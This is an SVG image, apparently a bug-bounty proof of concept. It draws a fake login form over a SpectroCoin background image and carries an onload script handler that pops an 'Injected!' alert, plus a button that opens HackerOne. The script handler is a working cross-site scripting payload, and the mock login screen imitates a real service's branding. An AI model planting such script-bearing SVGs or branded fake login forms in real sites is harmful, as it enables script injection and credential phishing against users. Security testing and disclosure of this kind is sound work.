<svg xmlns="http://www.w3.org/2000/svg" onload="alert('Injected!')" width="40%" height="40%" viewBox="0 0 800 600" style="font-family: Arial, sans-serif;">
  <style>
    .background {
      fill: none;
    }
    .container {
      fill: rgba(255, 255, 255, 0.85); /* Slight transparency for a cleaner overlay */
      stroke: #ccc;
      stroke-width: 1;
      rx: 10;
      ry: 10;
    }
    .title {
      fill: #ffffff;
      font-size: 24px;
      font-weight: bold;
    }
    .label {
      fill: #ffffff;
      font-size: 16px;
      font-weight: bold;
    }
    .input-box {
      fill: #ffffff;
      stroke: #aaa;
      stroke-width: 1;
      rx: 5;
      ry: 5;
    }
    .login-button {
      fill: #007bff;
      cursor: pointer;
      rx: 5;
      ry: 5;
    }
    .login-button:hover {
      fill: #0056b3;
    }
    .button-text {
      fill: #ffffff;
      font-size: 16px;
      font-weight: bold;
      pointer-events: none;
    }
  </style>
  
  <!-- Background Image -->
  <image href="https://spectrocoin.com/og/sc-og-fb.png" width="100%" height="100%" class="background" />

  <!-- Form Container -->
  <rect x="100" y="60" width="600" height="480" class="container" />

  <!-- Title -->
  <text x="400" y="140" class="title" text-anchor="middle">Login</text>

  <!-- Username label -->
  <text x="150" y="240" class="label">Username:</text>
  <!-- Username input box -->
  <rect x="300" y="220" width="400" height="40" class="input-box" />

  <!-- Password label -->
  <text x="150" y="320" class="label">Password:</text>
  <!-- Password input box -->
  <rect x="300" y="300" width="400" height="40" class="input-box" />

  <!-- Login button -->
  <rect x="350" y="400" width="200" height="60" class="login-button" onclick="window.open('https://www.hackerone.com', '_blank')" />
  <text x="450" y="440" class="button-text" text-anchor="middle">Login</text>
</svg>
